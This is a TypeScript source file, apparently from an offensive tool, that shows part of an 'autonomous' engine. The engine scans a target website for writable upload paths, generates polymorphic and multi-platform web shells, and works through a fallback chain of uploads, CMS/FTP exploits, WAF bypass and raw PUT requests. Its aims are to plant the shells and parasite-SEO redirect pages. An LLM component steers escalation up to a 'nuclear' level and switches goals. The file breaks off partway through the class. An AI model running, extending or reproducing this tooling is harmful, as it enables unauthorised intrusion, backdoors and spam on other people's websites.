// ═══════════════════════════════════════════════════════════════
//  AUTONOMOUS FRIDAY ENGINE — 3-Layer Autonomous Orchestrator
//  Ported from friday_attack.py with full web integration
//
//  Layer 1: AttackLoop — 7-step execution cycle
//  Layer 2: FixatedLoop — goal-fixated meta-loop with escalation
//  Layer 3: EmergentLoop — emergent behavior with drift/hack detection
//
//  Integration:
//  - Uses existing one-click-deploy for file deployment
//  - Uses enhanced-upload-engine for multi-vector upload
//  - Uses ai-prescreening for target intelligence
//  - SSE streaming for real-time progress
// ═══════════════════════════════════════════════════════════════

import {
  oneClickDeploy,
  parseProxyList,
  parseWeightedRedirects,
  type ProgressEvent,
  type DeployOptions,
} from "./one-click-deploy";
import { preScreenTarget, type PreScreenResult } from "./ai-prescreening";
import { tryAllUploadMethods } from "./alt-upload-methods";
import {
  smartRetryUpload,
  multiVectorParallelUpload,
  generatePolymorphicShell,
  generateMultiPlatformShells,
  detectServerPlatform,
} from "./enhanced-upload-engine";
import { stealthVerifyBatch, stealthBypassWaf, closeBrowser, isBrowserAvailable } from "./stealth-browser";
import { invokeLLM } from "./_core/llm";
import { AIAutonomousBrain, type AIStrategy, type AIDecision } from "./ai-autonomous-brain";

// ─── Types ───

export type AutonomousPhase =
  | "recon"
  | "vulnerability_scan"
  | "exploit_prep"
  | "initial_deploy"
  | "verify_deploy"
  | "escalate"
  | "persistence"
  | "parasite_deploy"
  | "geo_redirect"
  | "final_verify";

export type EscalationLevel =
  | "cautious"
  | "moderate"
  | "aggressive"
  | "reckless"
  | "desperate"
  | "nuclear";

export type GoalType =
  | "full_deploy"       // deploy all files + verify + redirect
  | "file_placement"    // just place files successfully
  | "shell_access"      // get shell access only
  | "parasite_seo"      // full parasite SEO campaign
  | "quick_test";       // quick test deploy

export interface AutonomousEvent {
  type: "layer_start" | "layer_complete" | "phase_start" | "phase_complete"
    | "step_detail" | "decision" | "escalation" | "adaptation"
    | "goal_drift" | "reward_hack" | "silent_fail" | "irreversible"
    | "world_update" | "module_exec" | "error" | "complete"
    | "ai_reasoning" | "progress";
  layer?: 1 | 2 | 3;
  phase?: string;
  step?: number;
  totalSteps?: number;
  detail?: string;
  data?: Record<string, unknown>;
  timestamp?: number;
  progress?: number; // 0-100
}

export type AutonomousCallback = (event: AutonomousEvent) => void;

export interface WorldState {
  hosts: string[];
  ports: Array<{ host: string; port: number; service?: string }>;
  vulns: Array<{ type: string; detail: string; severity: string }>;
  creds: Array<{ type: string; value: string }>;
  uploadPaths: string[];
  shellUrls: string[];
  deployedFiles: string[];
  verifiedUrls: string[];
  failedAttempts: Array<{ method: string; error: string; timestamp: number }>;
}

export interface AutonomousConfig {
  targetDomain: string;
  targetUrl: string;
  redirectUrl: string;
  goal: GoalType;
  maxWaves: number;        // Layer 2: max fixated waves
  maxEpochs: number;       // Layer 3: max emergent epochs
  maxCycles: number;       // Layer 1: max cycles per wave
  proxies: string[];
  seoKeywords: string[];
  geoRedirect: boolean;
  parasiteEnabled: boolean;
  parasiteContentLength: string;
  parasiteRedirectDelay: number;
  weightedRedirects: string;
  useAI: boolean;
  useStealth: boolean;
  useEnhancedUpload: boolean;
  methodPriority?: Array<{ id: string; enabled: boolean }>;
  aiBrain?: AIAutonomousBrain; // Shared AI Brain instance
}

// ─── Constants ───

const ESCALATION_LEVELS: Array<{
  name: EscalationLevel;
  retries: number;
  timeout: number;
  methods: string;
  description: string;
}> = [
  { name: "cautious", retries: 2, timeout: 10000, methods: "standard", description: "Standard methods, low retry" },
  { name: "moderate", retries: 3, timeout: 15000, methods: "standard+steganography", description: "Add steganography shells" },
  { name: "aggressive", retries: 5, timeout: 20000, methods: "all_upload", description: "All upload methods + WAF bypass" },
  { name: "reckless", retries: 7, timeout: 30000, methods: "all+multiplatform", description: "Multi-platform shells + boundary manipulation" },
  { name: "desperate", retries: 10, timeout: 45000, methods: "all+parallel", description: "Parallel multi-vector + enhanced engine" },
  { name: "nuclear", retries: 15, timeout: 60000, methods: "everything", description: "Every method, no limits, max aggression" },
];

const GOAL_CRITERIA: Record<GoalType, (world: WorldState) => boolean> = {
  full_deploy: (w) => w.deployedFiles.length > 0 && w.verifiedUrls.length > 0 && w.shellUrls.length > 0,
  file_placement: (w) => w.deployedFiles.length > 0 && w.verifiedUrls.length > 0,
  shell_access: (w) => w.shellUrls.length > 0,
  parasite_seo: (w) => w.deployedFiles.length >= 3 && w.verifiedUrls.length >= 3,
  quick_test: (w) => w.deployedFiles.length > 0,
};

const PHASE_SEQUENCE: AutonomousPhase[] = [
  "recon",
  "vulnerability_scan",
  "exploit_prep",
  "initial_deploy",
  "verify_deploy",
  "escalate",
  "persistence",
  "parasite_deploy",
  "geo_redirect",
  "final_verify",
];

// ═══════════════════════════════════════════════════════════════
// WORLD — Shared state across all layers
// ═══════════════════════════════════════════════════════════════

export class World {
  state: WorldState;
  private history: Array<{ action: string; result: unknown; timestamp: number }> = [];

  constructor() {
    this.state = {
      hosts: [],
      ports: [],
      vulns: [],
      creds: [],
      uploadPaths: [],
      shellUrls: [],
      deployedFiles: [],
      verifiedUrls: [],
      failedAttempts: [],
    };
  }

  addHost(host: string) {
    if (!this.state.hosts.includes(host)) {
      this.state.hosts.push(host);
    }
  }

  addPort(host: string, port: number, service?: string) {
    const exists = this.state.ports.find(p => p.host === host && p.port === port);
    if (!exists) {
      this.state.ports.push({ host, port, service });
    }
  }

  addVuln(type: string, detail: string, severity: string) {
    this.state.vulns.push({ type, detail, severity });
  }

  addCred(type: string, value: string) {
    this.state.creds.push({ type, value });
  }

  addUploadPath(path: string) {
    if (!this.state.uploadPaths.includes(path)) {
      this.state.uploadPaths.push(path);
    }
  }

  addShellUrl(url: string) {
    if (!this.state.shellUrls.includes(url)) {
      this.state.shellUrls.push(url);
    }
  }

  addDeployedFile(url: string) {
    if (!this.state.deployedFiles.includes(url)) {
      this.state.deployedFiles.push(url);
    }
  }

  addVerifiedUrl(url: string) {
    if (!this.state.verifiedUrls.includes(url)) {
      this.state.verifiedUrls.push(url);
    }
  }

  addFailedAttempt(method: string, error: string) {
    this.state.failedAttempts.push({ method, error, timestamp: Date.now() });
  }

  recordAction(action: string, result: unknown) {
    this.history.push({ action, result, timestamp: Date.now() });
  }

  counts() {
    return {
      hosts: this.state.hosts.length,
      ports: this.state.ports.length,
      vulns: this.state.vulns.length,
      creds: this.state.creds.length,
      uploadPaths: this.state.uploadPaths.length,
      shellUrls: this.state.shellUrls.length,
      deployedFiles: this.state.deployedFiles.length,
      verifiedUrls: this.state.verifiedUrls.length,
      failedAttempts: this.state.failedAttempts.length,
    };
  }

  summary(): string {
    const c = this.counts();
    return `hosts:${c.hosts} ports:${c.ports} vulns:${c.vulns} shells:${c.shellUrls} deployed:${c.deployedFiles} verified:${c.verifiedUrls} failed:${c.failedAttempts}`;
  }
}

// ═══════════════════════════════════════════════════════════════
// LAYER 1 — AttackLoop · 7-Step Execution Cycle
// ═══════════════════════════════════════════════════════════════

export class AttackLoop {
  world: World;
  private config: AutonomousConfig;
  private onProgress: AutonomousCallback;
  private prescreen: PreScreenResult | null = null;
  private currentPhase: AutonomousPhase = "recon";
  private cycleCount = 0;
  private strategy: EscalationLevel = "cautious";
  private stopped = false;
  private rules: string[] = [];
  private bannedMethods: Set<string> = new Set();
  aiBrain: AIAutonomousBrain;
  aiStrategy: AIStrategy | null = null;

  constructor(config: AutonomousConfig, onProgress: AutonomousCallback) {
    this.world = new World();
    this.config = config;
    this.onProgress = onProgress;
    this.aiBrain = config.aiBrain || new AIAutonomousBrain(onProgress);
  }

  stop() { this.stopped = true; }

  // ① Target — set target and gather initial info
  async target(): Promise<Record<string, unknown>> {
    this.onProgress({
      type: "step_detail", layer: 1, step: 1, totalSteps: 7,
      detail: `① เป้าหมาย: ${this.config.targetDomain}`,
      phase: "target",
    });

    this.world.addHost(this.config.targetDomain);

    // Pre-screening + AI Strategy
    if (this.config.useAI) {
      try {
        this.prescreen = await preScreenTarget(this.config.targetUrl);
        // AI Brain: analyze target and choose strategy
        try {
          this.aiStrategy = await this.aiBrain.analyzeTarget(this.config.targetDomain, this.prescreen);
        } catch { /* AI analysis optional */ }
        if (this.prescreen) {
          // Extract info from prescreen
          if (this.prescreen.serverType) {
            if (this.prescreen.serverType.toLowerCase().includes("nginx")) {
              this.world.addPort(this.config.targetDomain, 80, "nginx");
              this.world.addPort(this.config.targetDomain, 443, "nginx");
            } else if (this.prescreen.serverType.toLowerCase().includes("apache")) {
              this.world.addPort(this.config.targetDomain, 80, "apache");
              this.world.addPort(this.config.targetDomain, 443, "apache");
            }
          }
          // Open ports from prescreen
          if (this.prescreen.openPorts) {
            for (const p of this.prescreen.openPorts) {
              this.world.addPort(this.config.targetDomain, p.port, p.service);
            }
          }
          // Upload endpoints
          if (this.prescreen.uploadEndpoints) {
            for (const ep of this.prescreen.uploadEndpoints) {
              this.world.addUploadPath(ep);
            }
          }
          if (this.prescreen.writablePaths) {
            for (const wp of this.prescreen.writablePaths) {
              this.world.addUploadPath(wp);
            }
          }
          // Known vulnerabilities
          if (this.prescreen.knownVulnerabilities) {
            for (const v of this.prescreen.knownVulnerabilities) {
              this.world.addVuln(v.cve || "unknown", v.description || "", v.severity || "medium");
            }
          }
        }
      } catch (e) {
        // Pre-screening failed, continue without it
      }
    }

    return {
      target: this.config.targetDomain,
      url: this.config.targetUrl,
      prescreen: this.prescreen ? "completed" : "skipped",
      world: this.world.counts(),
    };
  }

  // ② Perceive — scan environment
  async perceive(): Promise<Record<string, unknown>> {
    this.onProgress({
      type: "step_detail", layer: 1, step: 2, totalSteps: 7,
      detail: `② รับรู้สภาพแวดล้อม — scanning ${this.config.targetDomain}`,
      phase: "perceive",
    });

    // Try to detect server platform
    try {
      const headers: Record<string, string> = {};
      if (this.prescreen?.serverType) headers["server"] = this.prescreen.serverType;
      const platforms = detectServerPlatform(headers, this.prescreen || undefined);
      if (platforms.length > 0) {
        this.world.addVuln("server_platform", `Detected: ${platforms.join(", ")}`, "info");
      }
    } catch (e) {
      // Ignore
    }

    // Check common upload paths
    const commonPaths = [
      "/wp-content/uploads/", "/uploads/", "/images/", "/media/",
      "/assets/", "/files/", "/tmp/", "/cache/",
      "/wp-includes/", "/admin/uploads/", "/public/uploads/",
    ];

    for (const path of commonPaths) {
      try {
        const resp = await fetch(`${this.config.targetUrl}${path}`, {
          method: "HEAD",
          signal: AbortSignal.timeout(5000),
          redirect: "follow",
        });
        if (resp.status < 404) {
          this.world.addUploadPath(path);
        }
      } catch (e) {
        // Path not accessible
      }
    }

    return {
      phase: "perceive",
      paths_found: this.world.state.uploadPaths.length,
      ports: this.world.state.ports.length,
      vulns: this.world.state.vulns.length,
      world: this.world.counts(),
    };
  }

  // ③ Assess — evaluate findings
  assess(): Record<string, unknown> {
    this.onProgress({
      type: "step_detail", layer: 1, step: 3, totalSteps: 7,
      detail: `③ ประเมินผลลัพธ์รวม`,
      phase: "assess",
    });

    const c = this.world.counts();
    let score = 0;
    let grade = "F";

    if (c.hosts > 0) score += 10;
    if (c.ports > 0) score += 15;
    if (c.uploadPaths > 0) score += 25;
    if (c.vulns > 0) score += 20;
    if (c.shellUrls > 0) score += 30;
    if (c.deployedFiles > 0) score += 30;
    if (c.verifiedUrls > 0) score += 20;

    if (score >= 90) grade = "A";
    else if (score >= 70) grade = "B";
    else if (score >= 50) grade = "C";
    else if (score >= 30) grade = "D";

    return {
      score, grade,
      world: c,
      goalMet: GOAL_CRITERIA[this.config.goal](this.world.state),
      recommendation: score < 30 ? "escalate" : score < 70 ? "continue" : "maintain",
    };
  }

  // ④ Decide — choose modules/strategy (AI-enhanced)
  async decide(assessment: Record<string, unknown>): Promise<Record<string, unknown>> {
    this.onProgress({
      type: "decision", layer: 1, step: 4, totalSteps: 7,
      detail: `④ ตัดสินใจ — strategy: ${this.strategy}`,
      phase: "decide",
    });

    const goalMet = assessment.goalMet as boolean;
    if (goalMet) {
      return { go: false, reason: "Goal already met", action: "success" };
    }

    // AI Brain: make decision based on current state
    if (this.config.useAI && this.cycleCount > 0) {
      try {
        const aiDecision = await this.aiBrain.makeDecision(
          this.world.state,
          this.strategy,
          this.config.goal,
          this.world.state.failedAttempts.slice(-10),
          this.cycleCount,
          this.config.maxCycles,
        );

        // Apply AI decision
        if (aiDecision.action === "abort") {
          return { go: false, reason: aiDecision.reasoning, action: "abort" };
        }
        if (aiDecision.action === "escalate" && aiDecision.suggestedEscalation) {
          this.strategy = aiDecision.suggestedEscalation;
          this.rules.push(`ai_escalate: ${aiDecision.suggestedEscalation}`);
        }
        if (aiDecision.action === "switch_goal" && aiDecision.suggestedGoal) {
          this.config.goal = aiDecision.suggestedGoal;
          this.rules.push(`ai_goal_switch: ${aiDecision.suggestedGoal}`);
        }
        if (aiDecision.action === "switch_method" && aiDecision.suggestedMethod) {
          this.rules.push(`ai_method_switch: ${aiDecision.suggestedMethod}`);
        }
      } catch { /* AI decision optional */ }
    }

    const score = assessment.score as number;
    const recommendation = assessment.recommendation as string;

    // Decide which phase to run next
    let nextPhase = this.currentPhase;
    const c = this.world.counts();

    if (c.shellUrls === 0 && c.deployedFiles === 0) {
      nextPhase = "initial_deploy";
    } else if (c.shellUrls > 0 && c.deployedFiles === 0) {
      nextPhase = "parasite_deploy";
    } else if (c.deployedFiles > 0 && c.verifiedUrls === 0) {
      nextPhase = "verify_deploy";
    } else if (c.verifiedUrls > 0 && this.config.geoRedirect) {
      nextPhase = "geo_redirect";
    } else if (recommendation === "escalate") {
      nextPhase = "escalate";
    }

    return {
      go: true,
      phase: nextPhase,
      strategy: this.strategy,
      score,
      methods: this.getMethodsForEscalation(),
      aiStrategy: this.aiStrategy,
    };
  }

  // ⑤ Execute — run the deploy pipeline with aggressive fallback chain
  async execute(decision: Record<string, unknown>): Promise<Record<string, unknown>> {
    if (!decision.go) {
      return { action: "stopped", reason: decision.reason };
    }

    const phase = decision.phase as string;
    this.currentPhase = phase as AutonomousPhase;
    const escLevel = ESCALATION_LEVELS.find(e => e.name === this.strategy);
    const CYCLE_TIMEOUT = escLevel?.timeout ? Math.max(escLevel.timeout * 3, 90_000) : 90_000;

    this.onProgress({
      type: "module_exec", layer: 1, step: 5, totalSteps: 7,
      detail: `⑤ ลงมือทำ — phase: ${phase}, escalation: ${this.strategy}`,
      phase,
    });

    // Helper: forward deploy progress events to autonomous events
    const forwardProgress = (event: ProgressEvent) => {
      this.onProgress({
        type: "step_detail",
        layer: 1,
        detail: event.detail || `Deploy: ${event.type}`,
        phase: `deploy_${event.phase || ""}`,
        data: event as unknown as Record<string, unknown>,
        progress: event.progress,
      });
      if (event.type === "phase_complete") {
        if (event.data?.shellUrl) this.world.addShellUrl(event.data.shellUrl as string);
        if (event.data?.verifiedUrl) this.world.addVerifiedUrl(event.data.verifiedUrl as string);
        if (event.data?.deployedFiles) {
          for (const f of event.data.deployedFiles as string[]) this.world.addDeployedFile(f);
        }
      }
    };

    // Helper: update world from deploy result
    const updateWorldFromResult = (result: any) => {
      if (result.shellUrl) this.world.addShellUrl(result.shellUrl);
      if (result.shellInfo?.url) this.world.addShellUrl(result.shellInfo.url);
      if (result.verifiedUrls) {
        for (const url of result.verifiedUrls) { this.world.addVerifiedUrl(url); this.world.addDeployedFile(url); }
      }
      if (result.parasiteUrls) {
        for (const url of result.parasiteUrls) this.world.addDeployedFile(url);
      }
      // Extract deployed files from DeployResult structure
      if (result.deployedFiles && Array.isArray(result.deployedFiles)) {
        for (const f of result.deployedFiles) {
          const url = typeof f === "string" ? f : f?.url;
          if (url) this.world.addDeployedFile(url);
        }
      }
      if (result.directUploadInfo?.uploadedFiles) {
        for (const f of result.directUploadInfo.uploadedFiles) {
          if (f.url) { this.world.addDeployedFile(f.url); this.world.addVerifiedUrl(f.url); }
        }
      }
      if (result.redirectInfo?.verifiedRedirectUrls) {
        for (const r of result.redirectInfo.verifiedRedirectUrls) {
          if (r.url) this.world.addVerifiedUrl(r.url);
        }
      }
    };

    // Helper: race a promise against timeout
    const withTimeout = <T>(promise: Promise<T>, ms: number, label: string): Promise<T> => {
      return Promise.race([
        promise,
        new Promise<never>((_, reject) => setTimeout(() => reject(new Error(`${label} timed out after ${ms / 1000}s`)), ms)),
      ]);
    };

    // Generate shell content for alt methods
    const shellContent = generatePolymorphicShell();
    const shellFileName = shellContent.filename;
    const shellFileContent = shellContent.code;

    // ═══ FALLBACK CHAIN: Try every method until one succeeds ═══
    const methodsAttempted: string[] = [];
    let overallSuccess = false;

    // ── Method 1: oneClickDeploy (standard pipeline) ──
    try {
      this.onProgress({
        type: "step_detail", layer: 1,
        detail: `🔄 Method 1: oneClickDeploy — standard pipeline`,
        phase: "deploy_oneclick",
      });
      methodsAttempted.push("oneClickDeploy");

      const result = await withTimeout(
        oneClickDeploy(this.config.targetDomain, this.config.redirectUrl, {
          seoKeywords: this.config.seoKeywords,
          proxies: this.config.proxies.map(p => ({ url: p, type: "http" as const })),
          maxRetries: escLevel?.retries || 3,
          uploadTimeout: 15000,
          verifyTimeout: 10000,
          scanTimeout: 8000,
          geoRedirectEnabled: this.config.geoRedirect,
          parasiteContentLength: (this.config.parasiteContentLength as "short" | "medium" | "long") || "medium",
          parasiteRedirectDelay: this.config.parasiteRedirectDelay,
          weightedRedirects: parseWeightedRedirects(this.config.weightedRedirects),
          preScreenResult: this.prescreen || undefined,
          methodPriority: this.config.methodPriority?.filter(m => m.enabled).map(m => m.id) || undefined,
          onProgress: forwardProgress,
        }),
        CYCLE_TIMEOUT,
        "oneClickDeploy",
      );

      updateWorldFromResult(result);
      this.world.recordAction("oneClickDeploy", result);

      // Check if files were actually deployed
      const filesDeployed = (result.summary?.totalFilesDeployed || 0) > 0
        || this.world.state.deployedFiles.length > 0
        || this.world.state.shellUrls.length > 0;

      if (filesDeployed) {
        this.aiBrain.recordSuccess("oneClickDeploy");
        overallSuccess = true;
        this.onProgress({
          type: "step_detail", layer: 1,
          detail: `✅ oneClickDeploy สำเร็จ — deployed ${this.world.state.deployedFiles.length} files`,
          phase: "deploy_oneclick",
        });
      } else {
        this.aiBrain.recordFailure("oneClickDeploy");
        this.world.addFailedAttempt("oneClickDeploy", `Completed but 0 files deployed (${result.summary?.successSteps || 0}/${result.summary?.totalSteps || 0} steps)`);
        this.onProgress({
          type: "step_detail", layer: 1,
          detail: `⚠️ oneClickDeploy completed but 0 files — trying alt methods...`,
          phase: "deploy_oneclick",
        });
      }
    } catch (error: unknown) {
      const errMsg = error instanceof Error ? error.message : String(error);
      this.world.addFailedAttempt("oneClickDeploy", errMsg);
      this.aiBrain.recordFailure("oneClickDeploy");
      this.onProgress({
        type: "step_detail", layer: 1,
        detail: `❌ oneClickDeploy failed: ${errMsg.slice(0, 100)} — trying alt methods...`,
        phase: "deploy_oneclick",
      });
    }

    // ── Method 2: tryAllUploadMethods (FTP, CMS exploits, WebDAV, API endpoints) ──
    if (!overallSuccess && this.prescreen && !this.stopped) {
      try {
        this.onProgress({
          type: "step_detail", layer: 1,
          detail: `🔄 Method 2: tryAllUploadMethods — FTP/CMS/WebDAV/API`,
          phase: "deploy_alt",
        });
        methodsAttempted.push("tryAllUploadMethods");

        const altResults = await withTimeout(
          tryAllUploadMethods(
            this.config.targetUrl,
            this.prescreen,
            shellFileContent,
            shellFileName,
            "/",
            (method, status) => {
              this.onProgress({
                type: "step_detail", layer: 1,
                detail: `  [Alt] ${method}: ${status}`,
                phase: "deploy_alt",
              });
            },
          ),
          CYCLE_TIMEOUT,
          "tryAllUploadMethods",
        );

        for (const r of altResults) {
          if (r.success && r.fileUrl) {
            this.world.addDeployedFile(r.fileUrl);
            this.world.addShellUrl(r.fileUrl);
            overallSuccess = true;
            this.aiBrain.recordSuccess(r.method);
            this.onProgress({
              type: "step_detail", layer: 1,
              detail: `✅ ${r.method} สำเร็จ — ${r.fileUrl}`,
              phase: "deploy_alt",
            });
          } else {
            this.world.addFailedAttempt(r.method, r.details || "failed");
            this.aiBrain.recordFailure(r.method);
          }
        }

        if (!overallSuccess) {
          this.onProgress({
            type: "step_detail", layer: 1,
            detail: `⚠️ tryAllUploadMethods: all methods failed — trying parallel upload...`,
            phase: "deploy_alt",
          });
        }
      } catch (error: unknown) {
        const errMsg = error instanceof Error ? error.message : String(error);
        this.world.addFailedAttempt("tryAllUploadMethods", errMsg);
        this.aiBrain.recordFailure("tryAllUploadMethods");
      }
    }

    // ── Method 3: multiVectorParallelUpload (parallel multi-vector with WAF bypass) ──
    if (!overallSuccess && !this.stopped) {
      try {
        this.onProgress({
          type: "step_detail", layer: 1,
          detail: `🔄 Method 3: multiVectorParallelUpload — parallel WAF bypass`,
          phase: "deploy_parallel",
        });
        methodsAttempted.push("multiVectorParallelUpload");

        const parallelResult = await withTimeout(
          multiVectorParallelUpload({
            targetUrl: this.config.targetUrl,
            fileContent: shellFileContent,
            fileName: shellFileName,
            uploadPaths: this.world.state.uploadPaths.length > 0
              ? this.world.state.uploadPaths.slice(0, 8)
              : ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/", "/media/", "/"],
            prescreen: this.prescreen,
            proxies: this.config.proxies.map(p => ({ url: p, type: "http" })),
            timeout: 20000,
            onMethodProgress: (method, status) => {
              this.onProgress({
                type: "step_detail", layer: 1,
                detail: `  [Parallel] ${method}: ${status}`,
                phase: "deploy_parallel",
              });
            },
          }),
          CYCLE_TIMEOUT,
          "multiVectorParallelUpload",
        );

        if (parallelResult.success && parallelResult.bestResult) {
          const best = parallelResult.bestResult;
          if (best.fileUrl) {
            this.world.addDeployedFile(best.fileUrl);
            this.world.addShellUrl(best.fileUrl);
            overallSuccess = true;
            this.aiBrain.recordSuccess("multiVectorParallelUpload");
            this.onProgress({
              type: "step_detail", layer: 1,
              detail: `✅ multiVectorParallelUpload สำเร็จ — ${best.fileUrl} (method: ${best.method})`,
              phase: "deploy_parallel",
            });
          }
        }

        // Also check individual results
        if (!overallSuccess) {
          for (const r of parallelResult.results) {
            if (r.success && r.fileUrl) {
              this.world.addDeployedFile(r.fileUrl);
              this.world.addShellUrl(r.fileUrl);
              overallSuccess = true;
              this.aiBrain.recordSuccess(r.method);
            }
          }
        }

        if (!overallSuccess) {
          this.world.addFailedAttempt("multiVectorParallelUpload", `${parallelResult.totalAttempts} attempts, all failed`);
          this.aiBrain.recordFailure("multiVectorParallelUpload");
          this.onProgress({
            type: "step_detail", layer: 1,
            detail: `⚠️ multiVectorParallelUpload: ${parallelResult.totalAttempts} attempts failed — trying smart retry...`,
            phase: "deploy_parallel",
          });
        }
      } catch (error: unknown) {
        const errMsg = error instanceof Error ? error.message : String(error);
        this.world.addFailedAttempt("multiVectorParallelUpload", errMsg);
        this.aiBrain.recordFailure("multiVectorParallelUpload");
      }
    }

    // ── Method 4: smartRetryUpload (adaptive retry with error learning) ──
    if (!overallSuccess && !this.stopped) {
      try {
        this.onProgress({
          type: "step_detail", layer: 1,
          detail: `🔄 Method 4: smartRetryUpload — adaptive retry with error learning`,
          phase: "deploy_smart",
        });
        methodsAttempted.push("smartRetryUpload");

        const smartResult = await withTimeout(
          smartRetryUpload(
            {
              targetUrl: this.config.targetUrl,
              fileContent: shellFileContent,
              fileName: shellFileName,
              uploadPaths: this.world.state.uploadPaths.length > 0
                ? this.world.state.uploadPaths.slice(0, 8)
                : ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/", "/media/", "/"],
              prescreen: this.prescreen,
              proxies: this.config.proxies.map(p => ({ url: p, type: "http" })),
              timeout: 20000,
              onMethodProgress: (method, status) => {
                this.onProgress({
                  type: "step_detail", layer: 1,
                  detail: `  [Smart] ${method}: ${status}`,
                  phase: "deploy_smart",
                });
              },
            },
            escLevel?.retries || 3,
          ),
          CYCLE_TIMEOUT,
          "smartRetryUpload",
        );

        if (smartResult.success && smartResult.bestResult) {
          const best = smartResult.bestResult;
          if (best.fileUrl) {
            this.world.addDeployedFile(best.fileUrl);
            this.world.addShellUrl(best.fileUrl);
            overallSuccess = true;
            this.aiBrain.recordSuccess("smartRetryUpload");
            this.onProgress({
              type: "step_detail", layer: 1,
              detail: `✅ smartRetryUpload สำเร็จ — ${best.fileUrl} (${smartResult.rounds} rounds)`,
              phase: "deploy_smart",
            });
          }
        }

        if (!overallSuccess) {
          this.world.addFailedAttempt("smartRetryUpload", `${smartResult.rounds} rounds, all failed`);
          this.aiBrain.recordFailure("smartRetryUpload");
        }
      } catch (error: unknown) {
        const errMsg = error instanceof Error ? error.message : String(error);
        this.world.addFailedAttempt("smartRetryUpload", errMsg);
        this.aiBrain.recordFailure("smartRetryUpload");
      }
    }

    // ── Method 5: Multi-platform shells (ASP, ASPX, JSP, CFM) for non-PHP servers ──
    if (!overallSuccess && !this.stopped) {
      try {
        const platforms = detectServerPlatform(
          this.prescreen?.serverType ? { server: this.prescreen.serverType } : {},
          this.prescreen || undefined,
        );
        const nonPhpPlatforms = platforms.filter(p => p !== "php" && p !== "unknown");

        if (nonPhpPlatforms.length > 0 || platforms.includes("unknown")) {
          this.onProgress({
            type: "step_detail", layer: 1,
            detail: `🔄 Method 5: Multi-platform shells — ${nonPhpPlatforms.length > 0 ? nonPhpPlatforms.join(", ") : "all platforms"}`,
            phase: "deploy_multiplatform",
          });
          methodsAttempted.push("multiPlatformShells");

          const shells = generateMultiPlatformShells(undefined, nonPhpPlatforms.length > 0 ? nonPhpPlatforms : undefined);
          for (const shell of shells) {
            if (this.stopped || overallSuccess) break;
            const uploadPaths = this.world.state.uploadPaths.length > 0
              ? this.world.state.uploadPaths.slice(0, 4)
              : ["/", "/uploads/", "/tmp/"];

            for (const path of uploadPaths) {
              if (this.stopped || overallSuccess) break;
              try {
                const uploadUrl = `${this.config.targetUrl}${path}${shell.filename}`;
                const resp = await fetch(uploadUrl, {
                  method: "PUT",
                  body: shell.code,
                  headers: {
                    "Content-Type": shell.contentType,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                  },
                  signal: AbortSignal.timeout(15000),
                });

                if (resp.ok || resp.status === 201) {
                  // Verify the file is accessible
                  const verifyResp = await fetch(uploadUrl, {
                    method: "HEAD",
                    signal: AbortSignal.timeout(8000),
                  });
                  if (verifyResp.ok) {
                    this.world.addDeployedFile(uploadUrl);
                    this.world.addShellUrl(uploadUrl);
                    overallSuccess = true;
                    this.aiBrain.recordSuccess(`multiPlatform_${shell.platform}`);
                    this.onProgress({
                      type: "step_detail", layer: 1,
                      detail: `✅ ${shell.platform} shell deployed — ${uploadUrl}`,
                      phase: "deploy_multiplatform",
                    });
                    break;
                  }
                }
              } catch {
                // Continue to next path
              }
            }
          }

          if (!overallSuccess) {
            this.world.addFailedAttempt("multiPlatformShells", "All platform shells failed");
            this.aiBrain.recordFailure("multiPlatformShells");
          }
        }
      } catch (error: unknown) {
        const errMsg = error instanceof Error ? error.message : String(error);
        this.world.addFailedAttempt("multiPlatformShells", errMsg);
      }
    }

    // ── Final Summary ──
    this.onProgress({
      type: "step_detail", layer: 1,
      detail: overallSuccess
        ? `✅ Execute สำเร็จ — ${this.world.state.deployedFiles.length} files, ${this.world.state.shellUrls.length} shells (methods: ${methodsAttempted.join(", ")})`
        : `❌ Execute ล้มเหลว — ลองแล้ว ${methodsAttempted.length} methods: ${methodsAttempted.join(", ")}`,
      phase: "deploy_summary",
    });

    return {
      success: overallSuccess,
      methodsAttempted,
      deployedFiles: this.world.state.deployedFiles,
      shellUrls: this.world.state.shellUrls,
      verifiedUrls: this.world.state.verifiedUrls,
      world: this.world.counts(),
    };
  }

  // ⑥ Verify — check results (AI-enhanced verification)
  async verify(execResult: Record<string, unknown>): Promise<Record<string, unknown>> {
    this.onProgress({
      type: "step_detail", layer: 1, step: 6, totalSteps: 7,
      detail: `⑥ ตรวจผลลัพธ์ (AI Verification)`,
      phase: "verify",
    });

    // AI Brain: smart verification first
    const allUrls = [...this.world.state.shellUrls, ...this.world.state.deployedFiles];
    if (this.config.useAI && allUrls.length > 0) {
      try {
        const aiVerifications = await this.aiBrain.verifyDeployment(allUrls);
        for (const v of aiVerifications) {
          if (v.accessible) {
            this.world.addVerifiedUrl(v.url);
            this.aiBrain.recordSuccess("verify");
          } else {
            this.aiBrain.recordFailure(v.wafBlocked ? "waf_block" : "verify_fail");
          }
        }
      } catch { /* AI verify optional */ }
    }

    const verified: string[] = [];
    const failed: string[] = [];

    // Verify shell URLs
    for (const url of this.world.state.shellUrls) {
      try {
        const resp = await fetch(url, {
          method: "GET",
          signal: AbortSignal.timeout(10000),
          redirect: "follow",
        });
        if (resp.status === 200) {
          verified.push(url);
          this.world.addVerifiedUrl(url);
        } else {
          failed.push(`${url} (${resp.status})`);
        }
      } catch (e) {
        failed.push(`${url} (timeout)`);
      }
    }

    // Verify deployed files
    for (const url of this.world.state.deployedFiles) {
      if (verified.includes(url)) continue;
      try {
        const resp = await fetch(url, {
          method: "HEAD",
          signal: AbortSignal.timeout(10000),
          redirect: "follow",
        });
        if (resp.status === 200) {
          verified.push(url);
          this.world.addVerifiedUrl(url);
        } else {
          failed.push(`${url} (${resp.status})`);
        }
      } catch (e) {
        failed.push(`${url} (timeout)`);
      }
    }

    // Stealth verification if available
    if (this.config.useStealth && verified.length === 0 && failed.length > 0) {
      try {
        if (await isBrowserAvailable()) {
          const stealthResults = await stealthVerifyBatch(
            this.world.state.shellUrls.concat(this.world.state.deployedFiles)
          );
          for (const sr of stealthResults) {
            if (sr.exists) {
              verified.push(sr.url);
              this.world.addVerifiedUrl(sr.url);
            }
          }
        }
      } catch (e) {
        // Stealth verify failed
      }
    }

    return {
      verified: verified.length,
      failed: failed.length,
      verifiedUrls: verified,
      failedUrls: failed,
      goalMet: GOAL_CRITERIA[this.config.goal](this.world.state),
      world: this.world.counts(),
    };
  }

